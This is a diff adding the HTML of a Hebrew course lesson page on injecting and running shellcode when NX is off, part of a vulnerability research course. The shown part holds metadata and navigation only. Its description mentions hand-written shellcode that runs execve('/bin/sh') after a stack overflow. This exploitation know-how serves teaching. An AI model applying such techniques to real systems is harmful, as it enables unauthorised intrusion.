@@ -1,0 +1,3124 @@
+
+<!doctype html>
+<html lang="he" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="בפרק הקודם (3.1) כתבנו shellcode ביד: רצף בתים גולמי שכל תפקידו להריץ execve("/bin/sh", 0, 0) ולפתוח לנו מעטפת. בפרק 2 למדנו לקחת שליטה מלאה על מצביע...">
+      
+      
+        <meta name="author" content="עמית פנחסי">
+      
+      
+        <link rel="canonical" href="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/3%20-%20Shellcode/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/">
+      
+      
+        <link rel="prev" href="../../3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/">
+      
+      
+        <link rel="next" href="../3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS הזנת" href="../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="הזנת RSS של תוכן מעודכן" href="../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>3.2 - הזרקה והרצה ללא NX - הרצאה - עמית טק</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Heebo:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Heebo";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../../stylesheets/themes.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  
+
+  <!-- Primary Meta Tags (name="description" is rendered by base.html from page.meta.description;
+       og:type/title/description/url and twitter:card/title/description are injected per-page by
+       the built-in social plugin - see material/plugins/social/templates/default.yml) -->
+  <meta name="author" content="עמית פנחסי">
+  <meta name="robots" content="index, follow">
+  <meta property="og:locale" content="he_IL">
+  <meta property="og:site_name" content="עמית טק">
+
+  
+  
+
+  <!-- Organization / WebSite structured data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "Organization",
+        "@id": "https://amittech.dev/#organization",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "logo": "https://amittech.dev/amittech.png",
+        "founder": {
+          "@type": "Person",
+          "name": "עמית פנחסי"
+        },
+        "sameAs": ["https://discord.gg/ef5PQAAca2"]
+      },
+      {
+        "@type": "WebSite",
+        "@id": "https://amittech.dev/#website",
+        "name": "עמית טק",
+        "url": "https://amittech.dev/",
+        "description": "קורסי סייבר, תכנות, IT ומחשבים בחינם בעברית - מעל 2000 שעות לימוד עם תרגול מעשי. מתאים למתחילים ולמתקדמים.",
+        "inLanguage": "he",
+        "publisher": { "@id": "https://amittech.dev/#organization" }
+      },
+      {
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "עמית טק",
+            "item": "https://amittech.dev/"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "3.2 - \u05d4\u05d6\u05e8\u05e7\u05d4 \u05d5\u05d4\u05e8\u05e6\u05d4 \u05dc\u05dc\u05d0 NX - \u05d4\u05e8\u05e6\u05d0\u05d4",
+            "item": "https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/3%20-%20Shellcode/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+
+  <!-- Apply saved theme before first paint (prevents flash of default theme) -->
+  <script>
+    (function () {
+      /* Dark-based theme ids; everything else is treated as a light (default) scheme. */
+      var DARK = {
+        midnight: 1, dracula: 1, nord: 1, gruvbox: 1, "solarized-dark": 1,
+        matrix: 1, amber: 1, synthwave: 1, ocean: 1, emerald: 1, rose: 1, violet: 1
+      };
+      var id;
+      try { id = localStorage.getItem("am-theme"); } catch (e) { id = null; }
+      if (!id) id = "light";
+      var root = document.documentElement;
+      root.setAttribute("data-theme", id);
+      root.setAttribute("data-md-color-scheme", DARK[id] ? "slate" : "default");
+    })();
+  </script>
+
+  
+<meta property="og:type" content="website" />
+<meta property="og:title" content="3.2 - הזרקה והרצה ללא NX - הרצאה - עמית טק" />
+<meta property="og:description" content="בפרק הקודם (3.1) כתבנו shellcode ביד: רצף בתים גולמי שכל תפקידו להריץ execve("/bin/sh", 0, 0) ולפתוח לנו מעטפת. בפרק 2 למדנו לקחת שליטה מלאה על מצביע..." />
+<meta property="og:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/3%20-%20Shellcode/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:url" content="https://amittech.dev/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/3%20-%20Shellcode/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" />
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="3.2 - הזרקה והרצה ללא NX - הרצאה - עמית טק" />
+<meta property="twitter:description" content="בפרק הקודם (3.1) כתבנו shellcode ביד: רצף בתים גולמי שכל תפקידו להריץ execve("/bin/sh", 0, 0) ולפתוח לנו מעטפת. בפרק 2 למדנו לקחת שליטה מלאה על מצביע..." />
+<meta property="twitter:image" content="https://amittech.dev/assets/images/social/%D7%9E%D7%97%D7%A7%D7%A8-%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/3%20-%20Shellcode/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX/3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94.png" />
+</head>
+  
+  
+    <body dir="rtl">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#-injection-shellcode" class="md-skip">
+          לדלג לתוכן
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="כותרת עליונה">
+    <a href="../../../.." title="עמית טק" class="md-header__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            עמית טק
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              3.2 - הזרקה והרצה ללא NX - הרצאה
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="חיפוש" placeholder="חיפוש" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="חיפוש">
+        
+        <button type="reset" class="md-search__icon md-icon" title="ניקוי" aria-label="ניקוי" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            אתחול חיפוש
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="לשוניות" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  דף הבית
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../about/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  מי אני
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  בלוג
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  תכנות
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  רשתות ומערכות הפעלה
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  אבטחת מידע וסייבר
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  מחקר ו-Low Level
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="ניווט" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="עמית טק" class="md-nav__button md-logo" aria-label="עמית טק" data-md-component="logo">
+      
+  <img src="../../../../amittech.png" alt="logo">
+
+    </a>
+    עמית טק
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    דף הבית
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מי אני
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../blog/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    בלוג
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%95%D7%95%D7%99%D7%A0%D7%93%D7%95%D7%A1-%D7%91%D7%A1%D7%99%D7%A1%D7%99/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    רשתות ומערכות הפעלה
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../../%D7%A4%D7%A8%D7%99%D7%A6%D7%AA-%D7%90%D7%AA%D7%A8%D7%99%D7%9D/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    אבטחת מידע וסייבר
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר ו-Low Level
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר ו-Low Level
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ליבת המחשב
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    מחקר חולשות
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    מחקר חולשות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../0%20-%20%D7%94%D7%A7%D7%93%D7%9E%D7%94%20%D7%95%D7%AA%D7%A9%D7%AA%D7%99%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA/0.1%20-%20%D7%9E%D7%94%20%D7%96%D7%94%20%D7%9E%D7%97%D7%A7%D7%A8%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0   הקדמה ותשתית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../1%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%A4%D7%A9%D7%95%D7%98%D7%95%D7%AA%20%D7%95%D7%91%D7%90%D7%92%D7%99%D7%9D%20%D7%9C%D7%95%D7%92%D7%99%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D/1.1%20-%20%D7%AA%D7%99%D7%90%D7%95%D7%A8%D7%99%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%95%D7%90%D7%A8%D7%92%D7%95%D7%9E%D7%A0%D7%98%D7%99%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1   חולשות פשוטות ובאגים לוגיים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../2%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20%D7%97%D7%95%D7%A6%D7%A5%20%D7%A2%D7%9C%20%D7%94%D7%9E%D7%97%D7%A1%D7%A0%D7%99%D7%AA/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP/2.1%20-%20%D7%90%D7%A0%D7%98%D7%95%D7%9E%D7%99%D7%94%20%D7%A9%D7%9C%20%D7%92%D7%9C%D7%99%D7%A9%D7%94%20%D7%95%D7%A9%D7%9C%D7%99%D7%98%D7%94%20%D7%91RIP%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2   גלישת חוצץ על המחסנית
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_5" id="__nav_7_2_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3   Shellcode
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    3   Shellcode
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.1   כתיבת shellcode ידני
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_5_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_5_2" id="__nav_7_2_5_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.2   הזרקה והרצה ללא NX
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_5_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    3.2   הזרקה והרצה ללא NX
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.2 - הזרקה והרצה ללא NX - הרצאה
